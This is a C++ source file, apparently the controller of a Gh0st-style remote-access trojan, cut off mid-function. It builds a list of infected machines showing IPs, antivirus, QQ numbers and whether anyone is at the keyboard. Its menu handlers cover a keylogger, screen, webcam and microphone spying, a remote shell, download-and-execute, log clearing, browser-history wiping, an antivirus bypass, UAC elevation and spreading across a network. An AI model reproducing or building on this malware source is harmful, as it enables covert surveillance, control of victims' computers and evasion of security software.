// PcView.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "PcView.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "Start.h"
#include "InputDlg.h"
#include "LogView.h"
#include "ChangeGroupDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "LocalUpload.h"
#include "OpenProxy.h"
#include "PrankDlg.h"
#include "UACYXDlg.h"
#include "MapDlg.h"
#include "MyChat.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pTabView;
extern CMainFrame* g_pFrame;
extern CIOCPServer* m_iocpServer;
extern SEU_QQwry *m_gQQwry;
extern CLogView* g_pLogView;
extern LPBYTE lpFilePacket ;
extern LPBYTE lpShellPacket;
extern LPBYTE lpScreenPacket;
extern LPBYTE lpScreenPacket1;
extern LPBYTE lpWebCamPacket;
extern LPBYTE lpAudioPacket ;
extern LPBYTE lpSystemPacket;
extern LPBYTE lpKeyboardPacket;
extern LPBYTE lpServicePacket;
extern LPBYTE lpRegeditPacket;
extern LPBYTE lpTextChatPacket;
extern LPBYTE lpProxyMapPacket;
extern int nFilePacketLength;
extern int nShellPacketLength;
extern int nScreenPacketLength;
extern int nScreenPacketLength1;
extern int nWebCamPacketLength;
extern int nAudioPacketLength;
extern int nSystemPacketLength;
extern int nKeyboardPacketLength;
extern int nServicePacketLength;
extern int nRegeditPacketLength;
extern int nTextChatPacketLength;
extern int nProxyPacketLength;

typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;
COLUMNSTRUCT g_Column_Data[] = 
{
	{_T("国家/地理位置"),	    130 },//0
	{_T("外网IP"),		       	95	},//1
	{_T("内网IP"),		       	95	},//2
	{_T("计算机名/备注"),       110	},//3
//	{_T("显卡显存"),			90	},//4 
	{_T("系统版本"),			70	},//4 
	{_T("32/64"),				50	},//5
	{_T("CPU"),		        	75  },//6
	{_T("内存"),	        	55  },//7
	{_T("Pin"),			     	40	},//8
	{_T("视频"),		      	40	},//9 
	{_T("上线时间"),		   	80	},//10
	{_T("安装时间"),		   	110	},//11
	{_T("杀毒软件"),	        70  },//12
	{_T("QQ"),		            90  },//13
	{_T("用户状态"),		    60	},//14
	{_T("启动方式"),	        60  },//15
	{_T("用户权限"),     	    90	},//16
};
int g_Column_DaWid[30]={0};
int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);
/////////////////////////////////////////////////////////////////////////////
// CPcView

IMPLEMENT_DYNCREATE(CPcView, CXTPListView)

CPcView::CPcView()
{
	m_QQwry = m_gQQwry;
	m_nCount = 0;
}

CPcView::~CPcView()
{
}


BEGIN_MESSAGE_MAP(CPcView, CXTPListView)
	//{{AFX_MSG_MAP(CPcView)
	ON_WM_SIZE()
	ON_WM_LBUTTONDOWN()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(ID_MENUITEM_SELECT_ALL, OnMenuitemSelectAll)
	ON_COMMAND(ID_MENUITEM_CHANGE_GROUP, OnMenuitemChangeGroup)
	ON_COMMAND(ID_MENUITEM_LOGOFF, OnMenuitemLogoff)
	ON_COMMAND(ID_MENUITEM_FILEMANAGER, OnMenuitemFilemanager)
	ON_COMMAND(ID_MENUITEM_REBOOT, OnMenuitemReboot)
	ON_COMMAND(ID_MENUITEM_SHUTDOWN, OnMenuitemShutdown)
	ON_COMMAND(ID_MENUITEM_REMOTESHELL, OnMenuitemRemoteshell)
	ON_COMMAND(ID_MENUITEM_SCREENSPY, OnMenuitemScreenspy)
	ON_COMMAND(ID_MENUITEM_SCREENSPY1, OnMenuitemScreenspy1)
	ON_COMMAND(ID_MENUITEM_WEBCAM, OnMenuitemWebcam)
	ON_COMMAND(ID_MENUITEM_AUDIO_LISTEN, OnMenuitemAudioListen)
	ON_COMMAND(ID_MENUITEM_REMARK, OnMenuitemRemark)
	ON_COMMAND(ID_MENUITEM_OPEN_URL_SHOW, OnMenuitemOpenUrlShow)
	ON_COMMAND(ID_MENUITEM_OPEN_URL_HIDE, OnMenuitemOpenUrlHide)
	ON_COMMAND(ID_MENUITEM_UNINSTALL, OnMenuitemUninstall)
	ON_COMMAND(ID_MENUITEM_UNSELECT_ALL, OnMenuitemUnselectAll)
	ON_COMMAND(ID_MENUITEM_SYSTEM, OnMenuitemSystem)
	ON_COMMAND(ID_MENUITEM_DOWNEXEC, OnMenuitemDownexec)
	ON_COMMAND(ID_MENUITEM_LOCAL_UPLOAD, OnMenuitemLocalUpload)
	ON_COMMAND(ID_MENUITEM_FIND_PROCESS, OnMenuitemFindProcess)
	ON_COMMAND(ID_MENUITEM_FIND_WINDOW, OnMenuitemFindWindow)
	ON_COMMAND(ID_MENUITEM_CLEAN_FIND, OnMenuitemCleanFind)
	ON_COMMAND(ID_MENUITEM_COPY_IP, OnMenuitemCopyIp)
	ON_COMMAND(ID_MENUITEM_COPY_ALL, OnMenuitemCopyAll)
	ON_COMMAND(ID_MENUITEM_UPDATE_SERVER, OnMenuitemUpdateServer)
	ON_COMMAND(ID_MENUITEM_KEYBOARD, OnMenuitemKeyboard)
	ON_COMMAND(ID_MENUITEM_MESSAGEBOX, OnMenuitemMessagebox)
	ON_COMMAND(ID_MENUITEM_SAVE_IPLIST, OnMenuitemSaveIplist)
	ON_COMMAND(ID_MENUITEM_PROXY, OnMenuitemProxy)
	ON_COMMAND(ID_MENUITEM_SERVICEMANAGER, OnMenuitemServicemanager)
	ON_COMMAND(ID_MENUITEM_REGEDIT, OnMenuitemRegedit)
	ON_COMMAND(ID_MENUITEM_TEXT_CHAT, OnMenuitemTextChat)
	ON_COMMAND(ID_MENUITEM_PRANK, OnMenuitemPrank)
	ON_COMMAND(ID_MENUITEM_CLEANEVENT_ALL, OnMenuitemCleaneventAll) //清理日志
	ON_COMMAND(ID_MENUITEM_PROXY_MAP, OnMenuitemProxyMap)
	ON_COMMAND(ID_DAK_JQB, OnChat)
	ON_NOTIFY_REFLECT(NM_CUSTOMDRAW, OnCustomDraw)
	ON_COMMAND(IDM_START, OnStart)
	ON_COMMAND(IDM_MAP, OnMap)
	ON_COMMAND(IDM_Elevate_Privileges, OnElevate_Privileges)//WIN7提升权限
	ON_COMMAND(ID_Screen,OnScreen)  //修改屏幕
	ON_COMMAND(ID_EXP_ReStart,OnReStartexp)//重启Exp
	ON_COMMAND(ID_GUO_QDX,OnQDX)//过360启动
	ON_COMMAND(ID_UV_ANZ,OnUV)//自动安装UV
	ON_COMMAND(ID_AK_ANZ,OnAK)//安装AK
	ON_COMMAND(IDM_NWCB, OnNWCB)//内网传播
	ON_COMMAND(ID_IEQC, OnIEQC) //删除IE历史记录
	ON_COMMAND(IDM_CHROME, OnMenuChrome)//Chrome
	ON_COMMAND(ID_IEQC1, OnIEQC1)//谷歌
	ON_COMMAND(ID_IEQC2, OnIEQC2)//skype 
	ON_COMMAND(ID_IEQC3, OnIEQC3)//火狐
	ON_COMMAND(ID_IEQC4, OnIEQC4)//360
	ON_COMMAND(ID_IEQC5, OnIEQC5)//QQ
	ON_COMMAND(ID_IEQC6, OnIEQC6)//搜狗
	

	ON_COMMAND(ID_UAC_QDX, OnUAC)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcView drawing

void CPcView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CPcView diagnostics

#ifdef _DEBUG
void CPcView::AssertValid() const
{
	CXTPListView::AssertValid();
}

void CPcView::Dump(CDumpContext& dc) const
{
	CXTPListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPcView message handlers
void CPcView::OnSize(UINT nType, int cx, int cy) 
{
	CListView::OnSize(nType, cx, cy);
	if (m_pListCtrl == NULL)
		return;
	if (m_pListCtrl->m_hWnd!=NULL)
	{
		if (m_pListCtrl != NULL)
		{
			int i;
			int str_cx [60] ={0};
			double dcx=(double)cx/g_Column_Width; 
			for(i=0;i<g_Column_Count;i++)
			{
				double dd=g_Column_DaWid[i];          //得到当前列的宽度
				dd = dd*dcx;
				str_cx[i] = (int)dd;
			}
			
			m_pListCtrl->LockWindowUpdate();
			for(i=0;i<g_Column_Count;i++)
			{
				m_pListCtrl->SetColumnWidth(i,str_cx[i]);       //设置当前的宽度
			}
			m_pListCtrl->UnlockWindowUpdate(); 
		}
	}
}
////////////////////////////////////////////////////////////////////////////////List图标
typedef struct _MSGINFO {
	UINT msg;     
} MSGINFO;   

MSGINFO msgInfo[] = { 
	{IDI_ICON1 },{IDI_ICON2 },{IDI_ICON3 },{IDI_ICON4 },{IDI_ICON5 },
	{IDI_ICON6 },{IDI_ICON7 },{IDI_ICON8 },{IDI_ICON9 },{IDI_ICON10 },
	{IDI_ICON11 },{IDI_ICON12 },{IDI_ICON13 },{IDI_ICON14 },{IDI_ICON15 },
	{IDI_ICON16 },{IDI_ICON17 },{IDI_ICON18 },{IDI_ICON19 },{IDI_ICON20 },
	{IDI_ICON21 },{IDI_ICON22 },{IDI_ICON23 },{IDI_ICON24 },{IDI_ICON25 },
	{IDI_ICON26 },{IDI_ICON27 },{IDI_ICON28 },{IDI_ICON29 },{IDI_ICON30 },
	{IDI_ICON31 },{IDI_ICON32 },{IDI_ICON33 },{IDI_ICON34 },{IDI_ICON35 },
	{IDI_ICON36 },{IDI_ICON37 },{IDI_ICON38 },{IDI_ICON39 },{IDI_ICON40 },
	{IDI_ICON41 },{IDI_ICON42 },{IDI_ICON43 },{IDI_ICON44 },{IDI_ICON45 },
	{IDI_ICON46 },{IDI_ICON47 },{IDI_ICON48 },{IDI_ICON49 },{IDI_ICON50 },
	{IDI_ICON51 },{IDI_ICON52 },{IDI_ICON53 },{IDI_ICON54 },{IDI_ICON55 },
	{IDI_ICON56 },{IDI_ICON57 },{IDI_ICON58 },{IDI_ICON59 },{IDI_ICON60 },
	{IDI_ICON61 },{IDI_ICON62 },{IDI_ICON63 },{IDI_ICON64 },{IDI_ICON65 },
	{IDI_ICON66 },{IDI_ICON67 },{IDI_ICON68 },{IDI_ICON69 },{IDI_ICON70 },
	{IDI_ICON71 },{IDI_ICON72 },{IDI_ICON73 },{IDI_ICON74 },{IDI_ICON75 },
	{IDI_ICON76 },{IDI_ICON77 },{IDI_ICON78 },{IDI_ICON79 },{IDI_ICON80 },
	{IDI_ICON81 },{IDI_ICON82 },{IDI_ICON83 },{IDI_ICON84 },{IDI_ICON85 },
	{IDI_ICON86 },{IDI_ICON87 },{IDI_ICON88 },{IDI_ICON89 },{IDI_ICON90 },
	{IDI_ICON91 },{IDI_ICON92 },{IDI_ICON93 },{IDI_ICON94 },{IDI_ICON95 },
	{IDI_ICON96 },{IDI_ICON97 },{IDI_ICON98 },{IDI_ICON99 },{IDI_ICON100 },
	{IDI_ICON101 },{IDI_ICON102 },{IDI_ICON103 },{IDI_ICON104 },{IDI_ICON105 },
	{IDI_ICON106 },{IDI_ICON107 },{IDI_ICON108 },{IDI_ICON109 },{IDI_ICON110 },
	{IDI_ICON111 },{IDI_ICON112 },{IDI_ICON113 },{IDI_ICON114 },{IDI_ICON115 },
	{IDI_ICON116 },{IDI_ICON117 },{IDI_ICON118 },{IDI_ICON119 },{IDI_ICON120 },
	{IDI_ICON121 },{IDI_ICON122 },{IDI_ICON123 },{IDI_ICON124 },{IDI_ICON125 },
	{IDI_ICON126 },{IDI_ICON127 },{IDI_ICON128 },{IDI_ICON129 },{IDI_ICON130 },
	{IDI_ICON131 },{IDI_ICON132 },{IDI_ICON133 },{IDI_ICON134 },{IDI_ICON135 },
	{IDI_ICON136 },{IDI_ICON137 },{IDI_ICON138 },{IDI_ICON139 },{IDI_ICON140 },
	{IDI_ICON141 },{IDI_ICON142 },{IDI_ICON143 },{IDI_ICON144 },{IDI_ICON145 },
	{IDI_ICON146 },{IDI_ICON147 },{IDI_ICON148 },{IDI_ICON149 },{IDI_ICON150 },
	{IDI_ICON151 },{IDI_ICON152 },{IDI_ICON153 },{IDI_ICON154 },{IDI_ICON155 },
	{IDI_ICON156 },{IDI_ICON157 },{IDI_ICON158 },{IDI_ICON159 },{IDI_ICON160 },
	{IDI_ICON161 },{IDI_ICON162 },{IDI_ICON163 },{IDI_ICON164 },{IDI_ICON165 },
	{IDI_ICON166 },{IDI_ICON167 },{IDI_ICON168 },{IDI_ICON169 },{IDI_ICON170 },
	{IDI_ICON171 },{IDI_ICON172 },{IDI_ICON173 },{IDI_ICON174 },{IDI_ICON175 },
	{IDI_ICON176 },{IDI_ICON177 },{IDI_ICON178 },{IDI_ICON179 },{IDI_ICON180 },
	{IDI_ICON181 },{IDI_ICON182 },{IDI_ICON183 },{IDI_ICON184 },{IDI_ICON185 },
	{IDI_ICON186 },{IDI_ICON187 },{IDI_ICON188 },{IDI_ICON189 },{IDI_ICON190 },
	{IDI_ICON191 },{IDI_ICON192 },{IDI_ICON193 },{IDI_ICON194 },{IDI_ICON195 },
	{IDI_ICON196 },{IDI_ICON197 },{IDI_ICON198 },{IDI_ICON199 },{IDI_ICON200 },
	{IDI_ICON201 },{IDI_ICON202 },{IDI_ICON203 },{IDI_ICON204 },{IDI_ICON205 },
	{IDI_ICON206 },{IDI_ICON207 },{IDI_ICON208 }
}; 
/////////////////////////////////////////////////////////////////////////////

void CPcView::OnInitialUpdate() 
{
	CXTPListView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	
	if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Guoqi", true) == 0)
	{
		m_pListCtrl = &GetListCtrl();
		I_ImageList.Create(20, 16, ILC_COLOR32,10, 0);
		HICON hIcon = NULL;//以下为加入3个图标资源
		hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_SHIPIN), IMAGE_ICON, 128, 128, 0);
		I_ImageList.Add(hIcon);
		hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME), IMAGE_ICON, 16, 16, 0);
		I_ImageList.Add(hIcon);
		ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);
		
	}
	else
	{
		m_pListCtrl = &GetListCtrl();
		//设置扩展风格 包括网格线等
		I_ImageList.Create(20, 16, ILC_COLOR32|ILC_MASK,10, 0);
		HICON hIcon = NULL;	// 以下为加入图标资源
		int Icot = sizeof(msgInfo)/sizeof(MSGINFO);
		for(int t=0; t<Icot; t++)
		{ 
			int Htms = msgInfo[t].msg;
			hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(Htms), IMAGE_ICON, 28, 14, 0);
			I_ImageList.Add(hIcon);
			DestroyIcon(hIcon); 
		}
		ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);  //将得到的操作系统的图像列表控件分配
	}
	
	//网格线
	if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Wange", false) == 0)
	{
		m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |           //有复选框
			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES/*| LVS_EX_GRIDLINES*/); //无网格线
	}
	else
	{
		m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |       //有复选框
			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES); //有网格线
	}

	ChildNotifyWidth();
 	
	g_Column_Width = 0;
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_DaWid[i]);
		g_Column_Width += g_Column_DaWid[i]; // 总宽度
	}
	//-----------------------初始化List列表列的宽度-------------------------//
	CRect rc;
	m_pListCtrl->GetClientRect(rc);
	int cx = rc.Width();
	if (m_pListCtrl == NULL)
		return;
	if (m_pListCtrl->m_hWnd!=NULL)
	{
		if (m_pListCtrl != NULL)
		{
			int i;
			int str_cx [60] ={0};
			double dcx=(double)cx/g_Column_Width; 
			for(i=0;i<g_Column_Count;i++)
			{
				double dd=g_Column_DaWid[i];          //得到当前列的宽度
				dd = dd*dcx;
				str_cx[i] = (int)dd;
			}
			
			m_pListCtrl->LockWindowUpdate();
			for(i=0;i<g_Column_Count;i++)
			{
				m_pListCtrl->SetColumnWidth(i,str_cx[i]);       //设置当前的宽度
			}
			m_pListCtrl->UnlockWindowUpdate(); 
		}
	}
}

void CPcView::ChildNotifyWidth()
{
	BOOL DaWids[30]={0};
	DaWids[0] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width01", TRUE); //国家/地理位置
	DaWids[1] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width02", TRUE); //外网IP
	DaWids[2] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width03", FALSE); //内网IP
	DaWids[3] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width04", TRUE);//计算机名/备注
	DaWids[4] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width05", TRUE); //系统版本
	DaWids[5] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width06", TRUE); //32/64
	DaWids[6] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width07", TRUE); //处理器
	DaWids[7] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width08", TRUE); //内存
	DaWids[8] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width09", TRUE);//Pin
	DaWids[9] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width10", TRUE); //视频
	DaWids[10] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width11", TRUE);//上线时间
	DaWids[11] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width12", TRUE);//安装时间
	DaWids[12] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width13", TRUE);//杀毒软件
	DaWids[13] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width14", FALSE);//QQ
	DaWids[14] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width15", TRUE);//用户状态
	DaWids[15] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width16", TRUE);//启动方式
	DaWids[16] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width17", TRUE);//用户权限
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		if(i==g_Column_Count)
			g_Column_DaWid[i] = 0;  //最后是分组 始终保持为零
		else
		{
			if(DaWids[i])
				g_Column_DaWid[i] = g_Column_Data[i].nWidth;
			else
				g_Column_DaWid[i] = 0;
		}
	}
	
}
void CPcView::NewInitialUpdate()
{
	OnInitialUpdate();
}
BOOL CPcView::PreCreateWindow(CREATESTRUCT& cs) 
{
	// TODO: Add your specialized code here and/or call the base class
	cs.style |= LVS_REPORT;
	return CXTPListView::PreCreateWindow(cs);
}

void CPcView::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme = m_header.GetTheme();
	if (pTheme)
	{
		DWORD dwStyle = pTheme->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme->SetDrawStyle(dwStyle, &m_header);
		m_header.RedrawWindow();
	}
}

void CPcView::OnMap() 
{
	// TODO: Add your command handler code here
	// TODO: Add your control notification handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if ( pos == NULL)
	{
		return;
	}
	ClientContext* pContext ;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		pContext= (ClientContext*)m_pListCtrl->GetItemData(nItem);
		break;
	} 


	CMapDlg 	dlg(NULL,pContext);
	dlg.DoModal();
}void CPcView::EnableControls(BOOL bRedraw)
{
	XTOSVersionInfo()->IsWinXPOrGreater();
	XTOSVersionInfo()->IsWinXPOrGreater();
	
	if (bRedraw)
	{
		RedrawWindow(NULL, NULL, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);
	}
}

void CPcView::OnCustomDraw(NMHDR* pNMHDR, LRESULT* pResult) 
{ 
	
	NMLVCUSTOMDRAW* pLVCD = (NMLVCUSTOMDRAW*)(pNMHDR); 
	*pResult = CDRF_NEWFONT; 
	if ( pLVCD->nmcd.dwDrawStage==CDDS_PREPAINT) 
	{ 
		*pResult = CDRF_NOTIFYITEMDRAW; 
	} 
	else if ( pLVCD->nmcd.dwDrawStage == CDDS_ITEMPREPAINT )  
	{
		int ListColor =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListColor", 1); //列表默认颜色
		
		if(ListColor == 0)
		{
				m_clrText = RGB(0,0,0);// 黑色
		}
		if(ListColor == 1)
		{
			m_clrText = RGB(255, 0, 0);// 红色
		}
		if(ListColor == 2)
		{
			m_clrText = RGB(0,100,255);//蓝色
		}
		if(ListColor == 3)
		{
			m_clrText = RGB(128, 128, 0) ; // 黄色
		}
		if(ListColor == 4)
		{
			m_clrText = RGB(0, 128, 0) ; // 绿色
		}
		if(ListColor == 5)
		{
			m_clrText =  RGB(160, 32, 240) ; // 紫色
		}
		pLVCD->clrText = m_clrText; 	
		*pResult = CDRF_DODEFAULT; 
	} 
}

LRESULT CPcView::OnAddToList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;

	if (pContext == NULL)
		return -1;

	CString	 strOS,strToolTipsText,strLogText;
    int i;
	try
	{
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		int nCnt = m_pListCtrl->GetItemCount();	

		CString	str;
		m_nCount++;

    // 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		
		if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
		{
			str=m_QQwry->IPtoAdd(IPAddress);
		}
		else
		{
			str = "未找到IP数据库";
		}

		//国旗
		int countryno=FindCountry(str);
		i = m_pListCtrl->InsertItem(nCnt, str, countryno);//使用指定图表
		m_pListCtrl->SetItemText(i, 0, str);


		// 外网Ip

		m_pListCtrl->SetItemText(i, 1, IPAddress);
		
		// 内网IP
		m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));
		
// 		// 主机名
 		m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);

		// 系统
		////////////////////////////////////////////////////////////////////////////////////////
		//操作系统
		char *pszOS = NULL;
		if (LoginInfo->dwMajorVer <= 4 )
		{
			pszOS = "NT";
			g_pFrame->nOSCount[0]++;
		}
		if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 0 )
		{
			pszOS = "2000";
			g_pFrame->nOSCount[1]++;
		}
		if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 1 )
		{
			pszOS = "XP";
			g_pFrame->nOSCount[2]++;
		}
		if ( LoginInfo->dwMajorVer == 5 && LoginInfo->dwMinorVer == 2 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "2003";
				g_pFrame->nOSCount[3]++;
			}
			else
			{
				pszOS = "2003R2";
				g_pFrame->nOSCount[3]++;
			}
		}
		if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 0 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "Vista";
				g_pFrame->nOSCount[4]++;
			}
			else
			{
				pszOS = "2008";
				g_pFrame->nOSCount[5]++;
			}
		}
		if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 1 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "7";
				g_pFrame->nOSCount[6]++;
			}
			else
			{
				pszOS = "2008 R2";
				g_pFrame->nOSCount[5]++;
			}
		}
		if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 2 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "8";
				g_pFrame->nOSCount[7]++;
			}
			else
			{
				pszOS = "2012";
				g_pFrame->nOSCount[8]++;
			}
		}
		if ( LoginInfo->dwMajorVer == 6 && LoginInfo->dwMinorVer == 3 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "8.1";
				g_pFrame->nOSCount[7]++;
			}
			else
			{
				pszOS = "2012 R2";
				g_pFrame->nOSCount[8]++;
			}
		}
		
		if ( LoginInfo->dwMajorVer == 10 && LoginInfo->dwMinorVer == 0 )
		{
			if( LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
			{
				pszOS = "10";
				g_pFrame->nOSCount[9]++;
			}
			else
			{
				pszOS = "2016";
				g_pFrame->nOSCount[10]++;
			}
		}

		strOS.Format("Win %s SP%d",pszOS, LoginInfo->OsVerInfoEx.wServicePackMajor);

		/////系统版本
		m_pListCtrl->SetItemText(i, 4, strOS);

		if(LoginInfo->bIsWow64)	
			str = " 64位";
		else
			str = " 32位";
		m_pListCtrl->SetItemText(i, 5, str);

		// CPU
		m_pListCtrl->SetItemText(i, 6, LoginInfo->CPUClockMhz);

		// 内存大小
		str.Format("%.2fGB",(float)LoginInfo->dwMemSize/1024);
		m_pListCtrl->SetItemText(i, 7, str);

		// ping
		str.Format("%d", LoginInfo->dwSpeed);
		m_pListCtrl->SetItemText(i, 8, str);

		// 视频状态
		if (!LoginInfo->bIsWebCam)
			str = "-/-";
		else
			str.Format("%d",LoginInfo->bIsWebCam);
		m_pListCtrl->SetItemText(i, 9, str);


		//上线时间
		SYSTEMTIME sys;   
		GetLocalTime(&sys);
		str.Format( "%02d:%02d %02d/%02d",sys.wHour,sys.wMinute,sys.wMonth,sys.wDay); 
		m_pListCtrl->SetItemText(i, 10, str);

		//安装时间
		m_pListCtrl->SetItemText(i, 11, LoginInfo->szInstallTime);

		// 杀毒软件
		str.Format("%s", LoginInfo->Virus);
		m_pListCtrl->SetItemText(i, 12, str);


		// 在线QQ
		str.Format(_T("%s"), LoginInfo->szQQNum );
		m_pListCtrl->SetItemText(i, 13, str);


		//用户
		if (
			LoginInfo->bIsActive)
			m_pListCtrl->SetItemText(i, 14, _T("无人操作"));
		else
			m_pListCtrl->SetItemText(i, 14, _T("有人操作"));


		m_pListCtrl->SetItemText(i, 15, LoginInfo->Pattern);

		//用户权限
		str.Format("%s", LoginInfo->Admin);
		m_pListCtrl->SetItemText(i, 16, str);

		strToolTipsText.Format("Host : %s\nCPU  : %s\nIP   : %s\nOS   : %s\nGroup: %s", 
			LoginInfo->HostName, LoginInfo->CPUClockMhz, IPAddress, strOS, LoginInfo->UpGroup);

		// 指定唯一标识
		m_pListCtrl->SetItemData(i, (DWORD) pContext);

		if (!((CClientApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);

		
		//加入日志列表
		strLogText.Format(_T("主机上线:[%s] - 计算机/备注:[%s] - 上线分组:[%s] - 外网IP:[%s]"),
			m_pListCtrl->GetItemText(i, 0), //区域
			m_pListCtrl->GetItemText(i, 3),  //主机名
			LoginInfo->UpGroup,              //上线分组
			m_pListCtrl->GetItemText(i, 1)); //外网IP
	
		g_pLogView->InsertLogItem(strLogText,0,1);

		lstrcpy(pContext->szOnlinePass,LoginInfo->szLionPass); //设置通讯秘钥

		if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
		{
			PlaySound(MAKEINTRESOURCE(IDR_WAVE_LOGIN),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
		}

		////////////////////////////////////////重复上线问题////////////////////////////////////////////////
		int Tmpi=0;
		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ ){
			if( m_pListCtrl->GetItemText( nCnt , 1 ) == m_pListCtrl->GetItemText( Tmpi , 1 ))
			{//先判断外网IP
				if( m_pListCtrl->GetItemText( nCnt , 2 ) == m_pListCtrl->GetItemText( Tmpi , 2 ))
				{//再判断内网IP
					CString strOSCount;
					strOSCount = m_pListCtrl->GetItemText( i, 5 );
					if ( strOSCount.Find(_T("XP")) != -1 )
					{
						g_pFrame->nOSCount[2]--;
					}else if ( strOSCount.Find(_T("Win 7")) != -1 )
					{
						g_pFrame->nOSCount[6]--;
					}else if ( strOSCount.Find(_T("2003")) != -1 )
					{
						g_pFrame->nOSCount[3]--;
					}else if ( strOSCount.Find(_T("Win 8")) != -1 )
					{
						g_pFrame->nOSCount[7]--;
					}else if ( strOSCount.Find(_T("2008")) != -1 )
					{
						g_pFrame->nOSCount[5]--;
					}else if ( strOSCount.Find(_T("Vista")) != -1 )
					{
						g_pFrame->nOSCount[4]--;
					}else if ( strOSCount.Find(_T("2012")) != -1 )
					{
						g_pFrame->nOSCount[8]--;
					}else if ( strOSCount.Find(_T("2000")) != -1 )
					{
						g_pFrame->nOSCount[1]--;
